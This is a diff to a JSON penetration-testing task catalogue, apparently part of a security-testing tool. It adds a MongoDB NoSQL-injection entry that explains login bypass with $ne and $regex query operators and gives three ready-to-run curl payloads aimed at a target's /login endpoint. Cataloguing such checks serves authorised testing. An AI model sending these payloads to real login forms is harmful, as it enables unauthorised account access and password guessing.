@@ -40,6 +40,21 @@
           ]
         }
       ]
+    },
+    {
+      "category": "3. NoSQL Injection (Web App Backed by Mongo)",
+      "tasks": [
+        {
+          "id": "mongo_nosqli_login_bypass",
+          "title": "Login Bypass via Query Operators",
+          "description": "If a web login form passes user input straight into a Mongo query (common with Node/Express apps parsing JSON bodies), operators like $ne/$gt/$regex can bypass authentication without any valid credentials. Doesn't require the DB port to be reachable at all — this is purely an HTTP-layer attack against the app.",
+          "commands": [
+            "curl -X POST http://{target_ip}/login -H 'Content-Type: application/json' -d '{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}'",
+            "curl -X POST http://{target_ip}/login -d 'username[$ne]=x&password[$ne]=x'",
+            "curl -X POST http://{target_ip}/login -H 'Content-Type: application/json' -d '{\"username\": \"admin\", \"password\": {\"$regex\": \"^a\"}}'"
+          ]
+        }
+      ]
     }
   ]
 }
